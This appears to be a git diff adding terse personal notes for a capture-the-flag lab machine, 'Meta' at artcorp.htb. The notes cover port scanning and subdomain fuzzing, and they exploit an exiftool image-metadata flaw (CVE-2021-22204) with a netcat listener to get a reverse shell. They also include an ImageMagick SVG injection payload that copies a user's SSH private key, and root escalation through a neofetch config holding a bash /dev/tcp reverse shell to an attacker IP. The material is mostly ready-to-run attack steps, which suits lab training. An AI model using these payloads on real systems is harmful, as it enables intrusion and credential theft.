@@ -1,0 +1,116 @@
+10.10.11.140 
+ttl 63 > linux
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)
+|   256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)
+|_  256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)
+80/tcp open  http    Apache httpd
+|_http-title: Did not follow redirect to http://artcorp.htb
+|_http-server-header: Apache
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+10.10.11.140	atrcorp.htb
+
+[+]Development in progress[+]
+
+[+]Possible targets[+]
+judy e.
+CEO
+sara w.
+Diseñador web
+Tomas S.
+Desarrollador PHP
+
+
+[+]GOBUSTER[+]
+assets
+css
+http://artcorp.htb/assets//favicon.ico
+
+
+[+]SUBDOMAIN ENUMERATION (FFUF)[+]
+./ffuf -c -u http://artcorp.htb -w /home/kyra/Desktop/Htb/Meta/exploit/subdomains-top1million-5000.txt -H "Host: FUZZ.artcorp.htb" -mc 200
+dev01                   [Status: 200]
+
+[+]NEW DOMAIN[+]
+http://dev01.artcorp.htb/
+
+ArtCorp dev environment
+Currently applications in development:
+MetaView
+* Only applications ready to be tested are listed
+
+[+]GOBUSTER 2[+]
+http://dev01.artcorp.htb/metaview/uploads
+http://dev01.artcorp.htb/metaview/assets
+http://dev01.artcorp.htb/metaview/lib
+http://dev01.artcorp.htb/metaview/vendor
+http://dev01.artcorp.htb/metaview/css
+
+
+http://dev01.artcorp.htb/metaview/index.php
+MetaView
+
+Upload your image to display related metadata.
+Choose file..
+
+[+]CVE-2021-22204-exiftool[+]
+git clone https://github.com/convisolabs/CVE-2021-22204-exiftool
+sudo apt install djvulibre-bin exiftool
+nano exploit.py //change $IP $PORT
+python3 exploit.py
+1 image file updated
+
+Upload image.jpg
+sudo nc -lvnp $PORT
+
+[+]GET REVERSHELL[+]
+
+TTY TREATMENT > https://github.com/PharaOhms/H4CK1NG/blob/main/tty
+
+www-data@meta:/home/thomas$ ls -l
+total 4
+-rw-r----- 1 root thomas 33 May  4 00:59 user.txt
+
+
+[+]FIND WRITEABLES DIRECTORIES[+]
+find . -writable
+
+[+]LINPEAS.SH[+]
+[+] [CVE-2019-13272] PTRACE_TRACEME
+Possible private SSH keys were found!
+/etc/ImageMagick-6/mime.xml
+/usr/share/man/man7/credentials.7.gz
+
+
+[+]user.txt[+]
+pspy64
+(#!/bin/bash)
+cd /var/www/dev01.artcorp.htb/convert_images/ && /usr/local/bin/mogrify -format png *.* 2>/dev/null
+pkill mogrify
+
+cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
+
+<image authenticate='ff" `echo $(cat ~/.ssh/id_rsa)> /dev/shm/id_rsa`;"'>
++GET ssh id_rsa+
+
+[+]root.txt[+]
+sudo -l
+root) NOPASSWD: /usr/bin/neofetch \"\"
+-bash-5.0$ cd ~/.config/neofetch/
+-bash-5.0$ ls -la
+total 24
+drwxr-xr-x 2 thomas thomas  4096 Feb 21 13:32 .
+drwxr-xr-x 3 thomas thomas  4096 Aug 30 13:01 ..
+-rw-r--r-- 1 thomas thomas 14591 Aug 30 13:01 config.conf
+
+
+/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1"
+export XDG_CONFIG_HOME="$HOME/.config"
+
+sudo -u root /usr/bin/neofetch \"\"
+
+root.txt
